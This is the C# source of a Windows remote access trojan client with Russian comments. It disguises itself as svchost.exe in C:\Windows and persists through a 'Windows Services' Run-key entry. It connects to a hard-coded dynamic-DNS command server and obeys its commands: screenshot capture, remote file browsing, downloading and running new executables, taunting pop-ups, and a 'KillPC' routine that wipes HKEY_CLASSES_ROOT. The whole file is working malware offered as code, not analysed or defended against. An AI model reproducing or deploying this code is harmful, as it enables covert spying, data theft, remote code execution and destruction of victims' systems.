
using System;
using System.Data;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using System.IO;
using System.Reflection;
using System.Drawing;
using System.Drawing.Imaging;
using System.Diagnostics;
using System.Xml.Serialization;

namespace ConsoleApplication2
{
    class Program
    {
        public static string clientName = "";
        public static string connectionString = "closirr.sytes.net";
        public static string connectionStringLocal = "127.0.0.1";

        public static readonly bool IsLocal = false;
        public static int port = 8005;
        public static string directoryToCopy = @"C:\Windows";
        public static string newName = @"svchost.exe";
        public static bool isLog = true;
        public static string updateName;


        /// ////////////      MAIN      ////////////////////////
    
        static void Main(string[] args)
        {
            try
            {
                WriteLog("Starting Client..", false);
                
                bool isDestinationFolder = String.Compare(Directory.GetCurrentDirectory(), directoryToCopy, StringComparison.OrdinalIgnoreCase) == 0 ? true:false;

                if (!isDestinationFolder)
                {
                    isLog = false;
                    Console.WriteLine(Process.GetProcesses());
                    CopyToDirectoty(directoryToCopy);
                    RegistryAutorun(directoryToCopy);
                    Process.Start(Path.Combine(directoryToCopy, newName));
                    Application.Exit();
                    System.Environment.Exit(1);

                }

                try
                {
                    Directory.Delete(@"c:\v2", true);
                }
                catch (Exception ex)
                {
                    Console.WriteLine("папка с новой версией уже удалена");
                }
               
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                WriteLog(ex.Message, true);
            }
            while (true)
            {
                try
                {
                    ConnectAsTcpClient();
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                    WriteLog(ex.Message, true);
                }
            }
           
        }

        private static void ConnectAsTcpClient()
        {
            bool isConnected = false;
            using (var tcpClient = new TcpClient())
            {
                Console.WriteLine("[Client] Connecting to server");
                WriteLog("[Client] Connecting to server", true);
                while (!isConnected)
                    try
                    {
                        Thread.Sleep(2000);
                        string conStr = connectionString;
                        if (IsLocal)
                        {
                            conStr = connectionStringLocal;
                        }
                        tcpClient.Connect(conStr, port);
                        isConnected = true;
                    }
                    catch (SocketException ex)
                    {
                        Console.WriteLine(ex.Message);
                        WriteLog(ex.Message, true);
                    }
                Console.WriteLine("[Client] Connected to server");
                WriteLog("[Client] Connected to server", true);

                //ENTER NAME
                //Console.Write("Enter client’s name:");
                //clientName = Console.ReadLine();
                clientName = Environment.MachineName;
                //MAIN STREAM
                using (var NS = tcpClient.GetStream())
                {
                    NS.ReadTimeout = 60000;
                    NS.WriteTimeout = 5000;
                    while (tcpClient.Connected)
                    {
                        try
                        {
                            string responce = "";
                            
                            responce = readStream(NS);

                            if (responce == "0")
                            {
                                Application.Restart();
                                Environment.Exit(1);
                            }
                            if (responce.Length > 100)
                            {
                                throw new Exception("Wrong new file name - file longer tahn 100 chars");
                            }
                            //Console.WriteLine("[Client] Server response was {0}", responce);
                            //WriteLog("[Client] Server response was " + responce, true);

                            if (responce != null || responce != "")
                            {
                                switch (responce)
                                {
                                    case "1"            : writeStream(clientName, NS); break;
                                    case "2"            : writeStream(responce, NS); break;
                                    case "TobiPizda":
                                        Thread myThread = new Thread(new ParameterizedThreadStart(ShowForm));
                                        myThread.Start("Тобі Пізда"); break;
                                    case "GetScreenshot": GetScreenshot(NS); break;
                                    case "KillPC"       : KillPC(); break;
                                    case "Restart"      : Application.Restart(); break;
                                    case "Exit"         : Application.Exit(); break;
                                    case "NewVersion": GetNewVersion(NS); break;
                                    case "UpdateApplication": UpdateApplication(); break;
                                    // File Explorer
                                    case "FilesExplorer": FilesExplorer(NS); break;
                                }
                            }

                        }
                        catch (System.IO.IOException ex)
                        {
                            //Console.WriteLine("Read timeout");
                            //WriteLog("Read timeout", true);
                            Console.WriteLine(ex.Message);
                            WriteLog(ex.Message, true);

                        }
                        catch (Exception ex)
                        {
                           // if (ex != System.IO.IOException)
                                Console.WriteLine(ex.Message);
                            WriteLog(ex.Message, true);
                        }
                    }
                    
                }
            }
        }

        private static void FilesExplorer(NetworkStream NS)
        {
            string[] localDrives = Directory.GetLogicalDrives();
            string oneString = String.Join("\n", localDrives);
            Console.WriteLine(oneString);
            writeStream(oneString, NS);

            string receivedFolder = "";
            string oldFolder = oneString;
            string[] folders;
            int i = 0;
            while (receivedFolder != "End" && i<100)
            {
                try
                {
                    receivedFolder = readStream(NS);
                    if (receivedFolder == "..")
                    {
                        receivedFolder = Directory.GetParent(oldFolder).FullName;
                    }
                    if (receivedFolder == "ToRoot") 
                    {
                        FilesExplorer(NS);
                    }
                    if (receivedFolder == "End") break;

                    folders = Directory.GetFileSystemEntries(receivedFolder);
                    // folders += Directory.GetFileSystemEntries
                    string oneStringFolders = String.Join("\n", folders);
                    Console.WriteLine(oneStringFolders);
                    writeStream(oneStringFolders, NS);
                    oldFolder = receivedFolder;
                }
                catch(Exception ex)
                {
                    Console.WriteLine(ex.Message);
                    i++;
                }
           }

        }

        private static void UpdateApplication()
        {
            if(updateName != "")
            try
            {
                Process.Start(@"C:\v2\" + updateName + @".exe");
                System.Environment.Exit(1);
                }
                catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }

            Console.WriteLine("ffff");
        }

        private static void GetNewVersion(NetworkStream NS)
        {
            try
            {
                updateName = readStream(NS);
                if (updateName.Length > 100)
                {
                    throw new Exception("Wrong new file name");
                }
                Directory.CreateDirectory(@"c:\v2");
                using (FileStream stream = new FileStream(@"C:\v2\"  + updateName + @".exe", FileMode.Create, FileAccess.Write))
                {

                    BinaryWriter f = new BinaryWriter(stream);
                    int bufSize = Int32.Parse(readStream(NS));
                    Thread.Sleep(20);
                    byte[] buf = new byte[bufSize];
                    NS.Read(buf, 0, bufSize);
                    f.Write(buf, 0, bufSize);
                    FileInfo fi = new FileInfo(@"C:/v2/" + updateName + @".exe");
                    int size = (int)fi.Length;
                    writeStream(size.ToString(), NS);

                    // Console.WriteLine(readStream(NS));
                    NS.Flush();
                }
            }
            catch(Exception ex)
            {
                Console.WriteLine(ex.Message);
               // writeStream(ex.Message,NS);
            }
        }

       


        private static void GetScreenshot(NetworkStream NS)
        {
            Bitmap printscreen = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics graphics = Graphics.FromImage(printscreen as Image);
            graphics.CopyFromScreen(0, 0, 0, 0, printscreen.Size);

            using (MemoryStream memoryStream = new MemoryStream())
            {
                byte[] bytes = ConvertToByte(printscreen, memoryStream);
                writeStream(bytes.Length.ToString(), NS);
                //Console.WriteLine(readStream(NS));
                Thread.Sleep(100);
                NS.Write(bytes, 0, bytes.Length);
                memoryStream.Flush();
                memoryStream.Close();
                memoryStream.Dispose();   
            }
            printscreen.Dispose();
            graphics.Dispose();
            //    res.Save(@"C:\printscreen.jpg", System.Drawing.Imaging.ImageFormat.Jpeg);
        }

        private static byte[] ConvertToByte(Bitmap bmp, MemoryStream memoryStream)
        {
           // MemoryStream memoryStream = new MemoryStream();
            // Конвертируем в массив байтов с сжатием Jpeg
            bmp.Save(memoryStream, System.Drawing.Imaging.ImageFormat.Jpeg);
            return memoryStream.ToArray();
        }

        private static void ShowForm(object str)
        {
            MessageBox.Show((string)str);
        }

        public static void writeStream(string str, NetworkStream NS)
        {
            if (str == null || str == "")
            {
                str = "0";
            }
            byte[] strByte = Encoding.UTF8.GetBytes(str);
            NS.Write(strByte, 0, strByte.Length);
            WriteLog("client Write:" + str, true);
        }

        public static string readStream(NetworkStream NS)
        {
            string str = "";
            var buffer = new byte[4096];

            var byteCount = NS.Read(buffer, 0, buffer.Length);
            str = Encoding.UTF8.GetString(buffer, 0, byteCount).Replace("\0", "") ;
            if (str == null || str == "")
            {
                str = "0";
            }
            return str;
            
        }

        private static string ClientRequestString = "Some HTTP request here";
        private static byte[] ClientRequestBytes
        {
            get
            {
                return Encoding.UTF8.GetBytes(ClientRequestString);
            }

        }

        public static void CopyToDirectoty(string destDirectory)
        {
            // Полный путь к программе.
            string currentAssembly = Assembly.GetExecutingAssembly().Location;
            // Название файла программы.
            string fileName = Path.GetFileName(currentAssembly);
            // Папка назначения.
            string destinationDirectory = Path.Combine(Directory.GetCurrentDirectory(), destDirectory/*.Replace(@"\", @"//")*/);
            // Проверяем, есть ли директория, если нет - создаём.
            if (!Directory.Exists(destinationDirectory))
                Directory.CreateDirectory(destinationDirectory);
            // Копируем в заданную папку, перезаписывая, при необходимости.
            File.Copy(currentAssembly, Path.Combine(destinationDirectory, newName), true);
        }

        public static void RegistryAutorun(string destDirectory)
        {

            RegistryKey regKay;
            regKay = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
            try
            {
                string currentAssembly = Assembly.GetExecutingAssembly().Location;
                // Название файла программы.
                string fileName = Path.GetFileName(currentAssembly);
                string Browse = @destDirectory + @"\" + newName;

                regKay.SetValue("Windows Services", Browse);
                regKay.Close();
            }
            catch(Exception ex)
            {
                Console.WriteLine(ex.Message);
                WriteLog(ex.Message, true);
            }
        }

        public static void WriteLog(string str, bool isWriteInExistingFile)
        {
            //using (FileStream fstream = new FileStream(Assembly.GetExecutingAssembly().Location + @"/" + "log.txt", FileMode.OpenOrCreate))
            //{

            //}
            if (isLog)
            using (StreamWriter sw = new StreamWriter(Directory.GetCurrentDirectory() + @"\" + "log.txt", isWriteInExistingFile, System.Text.Encoding.Default))
            {
                sw.WriteLine(str);
            }
        }

       
     

        public static void KillPC()
        {
            RegistryKey key = Registry.ClassesRoot;
            try
            {
                foreach (var a in key.GetSubKeyNames())
                {
                    try
                    {
                        key.DeleteSubKeyTree(@a.ToString());
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                        WriteLog(ex.Message, true);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                WriteLog(ex.Message, true);
            }
            key.Close();
        }

    }
}
